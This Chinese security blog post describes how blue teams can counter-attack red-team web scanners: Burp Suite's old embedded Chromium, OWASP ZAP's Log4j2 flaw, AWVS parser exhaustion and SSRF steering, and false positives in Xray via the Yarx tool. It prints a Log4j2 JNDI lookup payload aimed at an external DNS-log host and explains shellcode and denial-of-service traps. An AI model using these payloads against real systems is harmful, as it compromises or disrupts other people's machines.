#  第125篇：蓝队溯源之burpsuite、zap、AWVS、xray扫描器反制方法与复现   
 猫鼠信安   2025-06-04 06:08  
  
##   
## 注：仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布者不承担任何法律及连带责任。  
<table><tbody><tr style="outline: 0px;visibility: visible;"><td data-colwidth="557" width="557" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;visibility: visible;"><p style="margin-top: 8px;margin-bottom: 8px;outline: 0px;visibility: visible;"><span style="outline: 0px;font-size: 14px;visibility: visible;"><span style="outline: 0px;color: rgb(217, 33, 66);visibility: visible;"><strong style="outline: 0px;visibility: visible;"><span leaf="" style="visibility: visible;">声明：</span></strong></span><span leaf="" style="visibility: visible;">该公众号分享的安全工具和项目均来源于网络，仅供安全研究与学习之用，如用于其他用途，由使用者承担全部法律及连带责任，与工具作者和本公众号无关。</span></span></p></td></tr></tbody></table>  
  
现在只对常读和星标的公众号才展示大图推送，建议大家把  
猫鼠信安  
“  
设为星标  
”，  
否则可能看不到了  
！  
## Part1 前言   
  
最近我一直在更新蓝队分析取证工具箱中的溯源反制功能，为此阅读了大量相关的技术文章。很多资料提到了早期版本的Burpsuite、OWASP ZAP、AWVS、Xray等扫描器的反制思路，虽然这些方法大多适用于老版本，但其核心思路仍然值得借鉴。经过仔细研究和修正，今天写文章把复现过程和payload分享给大家。  
##  Part2 技术研究过程   
- Burpsuite  
反制方法  
  
##   
  
Burpsuite的反制方法之一，就是利用其内嵌的Chromium浏览器漏洞执行构造好的shellcode，从而导致burpsuite的使用者的电脑被反制。早期的burpsuite内嵌的Chromium浏览器的无界面模式，通过命令行方式打开网页，常用于自动化漏洞测试、网站爬虫、网站截图、XSS漏洞检测。如下图所示，早期的burpsuite内置的浏览器是chromium。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsHvM4icU1M91JhDdIqFN6NT0kSOowlaMVDicqfOfduHCUsO8AGs5qaNVA/640?wx_fmt=png&from=appmsg "")  
  
  
Chromium是由  
Google主导开发的开源浏览器项目，是Google Chrome的核心代码基础，Chrome谷歌浏览器是谷歌基于开源Chromium 项目制作的商业闭源产品。我们常见的浏览器Microsoft Edge、Brave、Opera、Vivaldi都是基于Chromium的。Burpsuite早期内置的Chromium版本较低，历史上存在多个Nday漏洞，攻击者可以构造特殊的html页面执行shellcode从而获取红队人员PC电脑的权限。  
  
将  
burpsuite2.0启动，通过进程分析发现，burpsuite对页面进行Reader渲染时，会调用Chromium并附带--no-sandbox参数，关闭沙盒限制，--headless就是无界面模式。在之后的版本中burpsuit升级使用了chrome.exe作为内嵌浏览器，并且在进程启用时删除了--no-sandbox参数。所以在后续版本的burpsuite想要利用同样的方法执行恶意的shellcode，必须首先想办法沙盒逃逸。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsbDA2eE2IIQhBLabdRPzyqTChDNjuTe1a2rJm9naAzATpKRPsXfnv4A/640?wx_fmt=png&from=appmsg "")  
  
  
如下图所示，  
Burpsuite的被动扫描功能默认情况下开了javascript分析引擎扫描javascript漏洞。该功能可以调用内置的浏览器渲染页面，从而触发相关nday浏览器漏洞，从而执行shellcode。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsZDxaNdUXhic9LGeHgTnXZiawr8hk49CHFibXzzp66gDf8MB2ZS42TwwbA/640?wx_fmt=png&from=appmsg "")  
  
  
大概有三种方式可以触发  
shellcode。第一种触发方法：使用浏览器挂上burpsuite的代理，被动扫描机制在分析页面的时候，就会造成shellcode执行从而弹出计算器或者上线CS。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsLibK7Gb5NBUOv0iaGcCC6sgNiazTlPFs0PJpPmHzEedoNfZvoyAwvQ83g/640?wx_fmt=png&from=appmsg "")  
  
  
第二种触发方式在历史记录汇总，只要点击一下  
“Render”按钮，可以直接弹出计算器。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibs6tY508SoJEqXyusn29toyUq9ERUO8Rqg2rUQgelCGYWLWljUC3cYPQ/640?wx_fmt=png&from=appmsg "")  
  
  
第三种方式会在  
“Repeater”测试漏洞的时候，点击“Render”渲染页面，会导致弹出计算器的命令。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsibmqWeao9Qa14QuStqicSyaRibwvdUJagGKJ2JbJt3cLhf8jXPx2IiaJ6Q/640?wx_fmt=png&from=appmsg "")  
  
- OWASP ZAP  
反制方法  
  
##   
  
关于  
OWASP ZAP扫描器的反制问题，主要参考了浅蓝的文章，他的文章给出的思路还是利用其存在的log4j2漏洞，漏洞的利用分为两种情况。  
  
第  
1种方式是主动利用。ZAP扫描器双击运行时，其代理监听端口8080会存在一个HTTP API服务的页面，这个API接口页面存在Log4j2漏洞。该漏洞经过测试，适用于OWASP ZAP <=2.11.0。访问如下  
url可以触发红队人员电脑的log4j2漏洞被利用，也可以构造一个页面嵌入如下url，在公司进行浏览或者扫描的时候会被触发log4j2漏洞的利用:  
```
http://127.0.0.1:8080/JSON/acsrf/view/optionPartialMatchingEnabled/?
apikey=${jndi:ldap://yrrp5c.dnslog.cn:53/exp}
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsPuxp9LmTtKVzKyt81jWQOo80Ujztia74XZQuiaFwnfFx5CafmCcY8zUg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsYG65BT0F96d5Sw8HQGrDa9uVRWzhyiaf4qQTPMLfvibNalJO983C3XJw/640?wx_fmt=png&from=appmsg "")  
  
  
第  
2种方式是被动利用。可以构造一个特殊的页面，一旦红队使用 OWASP ZAP 抓包访问该页面，扫描器便可能触发 Log4j2 漏洞，从而被蓝队人员反制。经过浅蓝的文章分析，发现  
ZAP_2.10.0版本的OWASP ZAP的插件pscanrules-release-*.jar插件存在log4j2漏洞，漏洞触发点如下，log.info方法存在日志拼接，可能存在log4j2漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsQPDlibjeLvU1eyUYiaeia2KcLL70gYCFzKQVLvQAx3LHfxCGYat9UnzBQ/640?wx_fmt=png&from=appmsg "")  
  
  
但是较新一点的  
2.11.0版本的pscanrules-release-*.jar插件方式变成了占位符的方式，从而杜绝了log4j2漏洞的利用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsaHuwozD97aImYsMkIfGAMdPa1jqBuOZ05S3hgL7dFYc751A9RRiaYDg/640?wx_fmt=png&from=appmsg "")  
  
  
继续分析代码发现，如果要触发  
log4j2漏洞，需要构造一个HTTP Digest验证的请求头，并将username的值赋值为log4j2的payload，以备让OWASP ZAP扫描到这个点去触发。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsHI5MIXKbP05k8US0ob9ibddicS4Lm5icyaia7hHF9DLtj5OQast11gLbNA/640?wx_fmt=png&from=appmsg "")  
  
  
最终依据上述代码，我使用  
python基于flask框架编写一个漏洞测试网页，根据这段漏洞代码，构造如下存在漏洞的页面。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibs8uYaSGnkuI7vy9QkM0rxdOvSPUcYrvgric3gRmBU19bOeCM8hvb0Dyw/640?wx_fmt=png&from=appmsg "")  
  
  
使用  
OWASP ZAP抓包浏览此页面，即可触发log4j2漏洞的利用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsepoicBDpHaFxVo98OwztTVpkJRU9ZCdX3VZBBSaP7KqXiaDIC8Bs6Yww/640?wx_fmt=png&from=appmsg "")  
  
  
如下图所示，  
dnslog.cn收到dns请求，说明存在漏洞。  
  
  
  
同样，也可以使用  
“AJAX Spider”进行爬虫，触发Log4j2漏洞，从而达到反制效果。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsK5vF5OI0bxlic9SlPtKVKF5YMd4GKZ9E3B8oo4PkXs3DNGCOTv7KgQw/640?wx_fmt=png&from=appmsg "")  
  
- AWVS  
反制方法  
  
##   
  
AWVS是众多商业Web漏洞扫描器中，我个人觉得非常好用及具有实战意义的扫描器。目前已知的 AWVS 反制方法主要集中在诱导扫描器执行高资源消耗操作，从而达到拒绝服务DoS或扫描效率瘫痪的效果。其中一种典型思路是利用AWVS在处理JavaScript文件时所使用的老版本解析库Acorn，如v2.6.5版本。该版本的 Acorn 缺乏针对递归深度和语法树节点数量的资源限制机制，存在设计缺陷。蓝队可基于此特性，构造大量无意义的 JavaScript 请求，如通过 for 循环批量嵌入 .get() 请求，使得 AWVS 在解析过程中不得不全量构建复杂的抽象语法树AST。虽然这些代码在浏览器中会因运行异常而快速终止，但扫描器作为静态解析工具，必须完整处理整个结构，进而导致内存异常增长、CPU 占用率飙升，最终拖慢甚至阻断扫描任务的执行。如下图所示，我使用  
python的flask框架写了一个demo代码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsvDHCicxiactN607AqCpJoLRwdlgVwC3OUmKWhicRuE1iacvVtU4VapsPUw/640?wx_fmt=png&from=appmsg "")  
  
  
如下图所示，  
CPU 长时间维持高占用状态，几乎满载，并且扫描任务进度条持续停滞，长时间无法推进。进一步通过 netstat -an 观察网络连接状态发现，AWVS 正在尝试向大量并不存在的目标地址发起连接请求。这些地址多为 JavaScript 文件中伪造构造的 URL，虽然在实际网络中并不可达，但 AWVS 依然将其解析并加入扫描任务队列，导致其不断尝试建立无效连接，最终造成系统资源被持续占用，扫描任务陷入卡顿甚至无法完成的状态。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsFWckW4fpicUHNAJpENakPL9c5enBppUzk4flBTS8sJ0Nh2Bx9g73icyA/640?wx_fmt=png&from=appmsg "")  
  
  
该方法还可以进一步扩展为主动引导型反制策略。例如，蓝队可以将  
 JS 文件中的请求地址替换为内网常见设备，如路由器、交换机等已知存在远程命令执行RCE漏洞的接口路径，或是包含 Struts2、Log4j2 等框架漏洞的典型 URL。这样一来，一旦红队在目标环境中使用 AWVS 扫描这些页面，扫描器便会自动访问并触发这些特定路径，实质上变成对红队所处内网环境的反向漏洞扫描与攻击行为。  
  
  
- Xray  
反制方法  
  
##   
  
针对  
Xray等Web漏洞扫描器的反制手段中，有一种常见思路是通过构造误导性的页面响应内容，干扰其特征匹配机制，从而制造大量误报。Xray等扫描器的工作原理通常依赖于返回页面中的特定关键字、响应结构、状态码组合等特征来判断漏洞是否存在。因此，如果有意识地在页面中嵌入这些特征，例如：SQL 报错信息、模板注入回显、命令执行提示等，就可以让 Xray 在扫描时误判为存在大量漏洞，最终导致其扫描结果充满误报，从而影响扫描结果，甚至无法继续使用扫描器。  
  
为便于复现这一反制机制，社区中出现了名为  
 Yarx 的开源工具，名称即为xray的反向拼写。Yarx的核心功能是根据 Xray 所使用的 YAML 格式 POC 规则，自动生成一个符合规则触发条件的模拟服务端。在该模拟服务运行时，任何使用 Xray 对其发起扫描的请求，都将命中预设的漏洞触发逻辑，造成Xray误以为扫描目标存在大量真实漏洞，从而达到误导和反制的目的。使用如下命令，可以启动一个  
url地址：  
```
.yarx -p ./pocs -l 0.0.0.0:8080
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsvk8mYI4TbOpLLSXYG7TJzuRibe9hDKldVXmPoULCM1gfribf17PlewyQ/640?wx_fmt=png&from=appmsg "")  
  
  
接下来使用  
xray对该地址进行漏洞扫描：  
```
xray webscan --plugins phantasm --html-output yarx.html
--url http://192.168.237.1:8001/
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibsabcdibPMolqlfqA8VaTWGWysB38hXW8Hew9ckgvQ8aOfQ5ABq1LJnyA/640?wx_fmt=png&from=appmsg "")  
  
  
如下图所示，这是  
xray最终的扫描报告，发现大量的无意义的漏洞存在。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AYCeH4qpJ2frKNYiaqfVGibs6j92YjibCkq5xF8V27tOOmN2hakIIzdzGfeicgmow6wKeMFtX8Ykgpgw/640?wx_fmt=png&from=appmsg "")  
  
##  Part3 总结   
  
1.   
 对于扫描器的反制，可利用扫描器内置组件（如浏览器、日志系统）中的 n-day 漏洞实现反制。  
  
2.  
  对于扫描器的反制，可通过构造伪造响应内容，制造误报干扰扫描结果。  
  
3.  
  对于扫描器的反制，可引导扫描器发起 SSRF 请求，反打红队所在环境。  
  
4.  
  未完待续，敬请期待。  
  
       
  
## 点击下方名片进入公众号  
  
  
